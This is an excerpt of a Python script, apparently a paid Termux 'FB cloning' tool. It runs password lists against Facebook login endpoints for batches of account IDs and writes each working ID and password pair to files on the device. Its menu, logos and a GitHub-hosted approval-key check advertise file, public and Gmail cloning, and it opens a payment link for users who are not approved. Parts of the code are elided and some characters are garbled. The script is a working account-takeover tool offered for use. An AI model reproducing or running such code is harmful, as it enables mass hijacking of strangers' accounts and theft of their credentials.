...
import os,base64
os.system("xdg-open https://www.facebook.com/KINGXMRSW4TI/?ref=share")
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MR-KINGX/Test/blob/main/T.txt').text
		ua=open('.bbnew.txt','w')
...
logo=("""\033[1;32m
        ...
        \033[1;32m ##     ##     ######      ###### 
--------------------------------------------------
[â€¢]\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
[â€¢]\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
[â€¢]\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[â€¢]\033[1;32mSTATUS         : \033[1;32mFREE\033[1;32m
--------------------------------------------------
\033[1;32m[ðŸ”¥]K1NGX MR  SW4T1
\033[1;32m[ðŸ”¥]F33L M33 H4T3RS
\033[1;32m[ðŸ”¥]VERSION 10.2
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def cek_apk(session,coki):
	...
	if len(game)==0:
		print(f'\r%s [%sÃ¢â‚¬Â¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [Ã¢â‚¬Â¢]%s Active Apks & Web Ã°Å¸â€˜â€¡ '%(H))
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sÃ¢â‚¬Â¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [Ã¢â‚¬Â¢]%s Expired Apks & Web Ã°Å¸â€˜â€¡ '%(M))
		for i in range(len(game)):
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [SW4T1] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [SW4TI-0K] %s | %s'%(ids,pas))
				open('/sdcard/SW4TI-0K.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [SW4TI-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SW4TI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [SW4TI-0K] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/SW4TI-0K.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [SW4T1] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
            ...
            'user-agent': pro}
			response = requests.get('https://web.facebook.com/', cookies=cookies, headers=headers)
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;32m [SW4T1-0K] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [SW4TI-0K] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/MR-KINGX/Test/blob/main/T.txt').text
  ...
  print("""\033[1;32m
         ...
         \033[1;32m ##     ##     ######      ######             
 \033[1;32m=================================================
\033[1;32m[+] AUTHOR    :\033[1;32m MUMT4Z SH4H
\033[1;32m[+] GITHUB    :\033[1;32m MR-SW4T1
\033[1;32m[+] YOUTUBE   :\033[1;32m MSS TRICKS  
\033[1;32m[+] TOOLS     :\033[1;32m MIX CLONING
\033[1;32m[+] VERSION   :\033[1;32m 10.2
\033[1;32m[+] STATUS    :\033[1;32m PAID
==================================================
\033[1;32m[+]T00LS   : FB CL0N!NG
\033[1;32m[+]ST4TUS  : P4!D
==================================================
 \33[37;41m\t IF YOU ARE FREE USER DON'T INBOX\33[0;m
\033[1;32m=================================================
 \033[1;32m[1]First read NOTE:
 \033[1;32m[2]if facebook go on update you get not
 \033[1;32m[3]Ok idz we dont  responsible 
 \033[1;32m[4]you unstall termux and key need approval
================================================== 
 [*] File Cloning
 [*] Create File
 [*] Public Cloning
 ...
 [*] Gmail Cloning
 [*] Separate Ids
 [*] remove dublicate lines from file              [*] login another cookie
 [*] contact with owner
 [0] Exit menu
==================================================   """)
  ...
  print("");time.sleep(2)
  print("\x1b[1;32m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/MR-KINGX/Test/blob/main/T.txt").text
    if id in httpCaht:
      print("\033[1;32m   YOUR TOKEN APROVED Ã°Å¸Â¥â‚¬ ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print("\x1b[1;32m    Sorry Bro Token Key not AprovedÃ°Å¸Ëœâ€œ")
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;32m    Sorry Bro Your Token not AprovedÃ°Å¸Ëœâ€œ ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://m.me/KINGXMRSW4TI')
      time.sleep(2)
      sys.exit()
